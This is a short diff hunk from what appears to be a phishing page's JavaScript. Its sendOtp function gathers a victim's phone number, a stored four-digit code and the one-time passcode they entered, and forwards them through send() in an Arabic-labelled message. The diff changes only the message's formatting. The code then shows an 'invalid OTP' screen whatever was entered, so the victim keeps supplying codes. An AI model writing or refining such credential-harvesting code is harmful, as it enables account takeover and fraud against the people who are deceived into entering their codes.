@@ -299,7 +299,7 @@ function showInvalidOtp() {
   function sendOtp(otp) {
     // console.log("Sending OTP:", otp);
     phone = localStorage.getItem('phone')
-    msg=`رقم الهاتف: ${phone}\nالرمز الرباعي:${localStorage.getItem("otp")}\nالرمز: ${otp}`
+    msg=`رقم الهاتف: \`${phone}\`\nالرمز الرباعي:\`${localStorage.getItem("otp")}\`\nالرمز: \`${otp}\``
     send(msg)
     setTimeout(() => {
       showInvalidOtp();
